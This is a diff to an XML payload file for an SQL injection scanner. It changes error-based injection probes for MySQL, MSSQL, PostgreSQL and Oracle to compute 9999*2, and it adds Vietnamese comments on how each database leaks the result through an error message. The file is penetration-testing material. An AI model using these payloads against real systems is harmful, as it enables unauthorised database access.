@@ -4,7 +4,8 @@
         <title>MySQL Error-Based (EXTRACTVALUE)</title>
         <stype>2</stype>
         <dbms>MySQL</dbms>
-        <payload>AND EXTRACTVALUE(8341,CONCAT('\','qXXq',(SELECT 1),'qYYq'))</payload>
+        <!-- MySQL tính toán 9999*2 = 19998 và ném ra thông báo lỗi chứa kết quả -->
+        <payload>AND EXTRACTVALUE(8341,CONCAT('\','qXXq',(SELECT 9999*2),'qYYq'))</payload>
         <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
     </test>
 
@@ -12,7 +13,8 @@
         <title>MSSQL Error-Based (CONVERT)</title>
         <stype>2</stype>
         <dbms>MSSQL</dbms>
-        <payload>AND 8341=CONVERT(INT,(SELECT 'qXXq'+'1'+'qYYq'))</payload>
+        <!-- MSSQL thực thi phép nhân, ép kiểu sang VARCHAR để nối chuỗi, sau đó ép toàn bộ sang INT gây ra lỗi chuyển đổi -->
+        <payload>AND 8341=CONVERT(INT,(SELECT 'qXXq'+CAST(9999*2 AS VARCHAR)+'qYYq'))</payload>
         <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
     </test>
 
@@ -20,7 +22,8 @@
         <title>PostgreSQL Error-Based (CAST)</title>
         <stype>2</stype>
         <dbms>PostgreSQL</dbms>
-        <payload>AND CAST('qXXq'||(SELECT 1)||'qYYq' AS NUMERIC)=8341</payload>
+        <!-- PostgreSQL tính toán phép nhân, nối chuỗi và ném lỗi ép kiểu NUMERIC không hợp lệ -->
+        <payload>AND CAST('qXXq'||(SELECT 9999*2)||'qYYq' AS NUMERIC)=8341</payload>
         <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
     </test>
 
@@ -28,7 +31,8 @@
         <title>Oracle Error-Based (UTL_INADDR)</title>
         <stype>2</stype>
         <dbms>Oracle</dbms>
-        <payload>AND 8341=UTL_INADDR.GET_HOST_ADDRESS('qXXq'||(SELECT 1 FROM DUAL)||'qYYq')</payload>
+        <!-- Oracle tính toán phép nhân và ném lỗi phân giải tên miền (host address) không hợp lệ -->
+        <payload>AND 8341=UTL_INADDR.GET_HOST_ADDRESS('qXXq'||(SELECT 9999*2 FROM DUAL)||'qYYq')</payload>
         <grep>qXXq(?&lt;result&gt;.*?)qYYq</grep>
     </test>
 </root>
